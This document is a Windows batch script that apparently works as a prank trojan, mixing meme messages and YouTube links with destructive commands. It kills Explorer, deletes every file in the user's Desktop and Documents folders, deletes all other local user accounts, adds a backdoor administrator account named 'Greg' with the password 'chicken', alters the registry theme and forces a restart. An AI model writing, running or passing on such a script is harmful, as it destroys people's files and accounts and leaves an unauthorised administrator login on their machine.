@echo off
taskkill /f /im explorer.exe
start "" https://www.youtube.com/shorts/ZpOxSVb_YAM
del %userprofile%\Desktop\*.*
del %userprofile%\Documents\*.*
msg * "THIS PC HAS BEEN HACKED"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes" /v CurrentTheme /t REG_SZ /d "Windows Classic" /f
start https://www.youtube.com/shorts/qNXejcWThEU
start https://www.youtube.com/shorts/LnAXv-J1i3g
msg * "driving in my car right after a beer"
timeout 5 >nul
msg * "hey that bump is shaped like a deer"
timeout 5 >nul
msg * "DUI? How about you die"
timeout 5 >nul
msg * "i'll go 100 miles an hour"
timeout 5 >nul
msg * "little do you know i'm filled up on gas"


for /f "tokens=2 delims=\" %%a in ("%username%") do set currentUser=%%a
if not defined currentUser set currentUser=%username%
for /f "skip=1" %%u in ('wmic useraccount get name') do (
    set "user=%%u"
    setlocal enabledelayedexpansion
    set "trim=!user: =!"
    if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
        msg * "!trim! is shaped like a deer - asgore"
        net user "!trim!" /delete
    )
    endlocal

    
)
net user "Greg" chicken /add
net localgroup Administrators Greg /add
start https://www.youtube.com/shorts/XmklZl8QuRA
start https://robloxcities.fandom.com/wiki/Free_Schlepington_Movement
msg * "FREE SCHLEP"
shutdown /r /t 180 /c "THIS PC WILL CLOSE IN 3 MINUTES AND ALL USERS ARE REMOVED"
start explorer.exe
msg * "DO NOT BAN GIGGITY FILES"
timeout 3 >nul
msg * "DO NOT RESET VM"
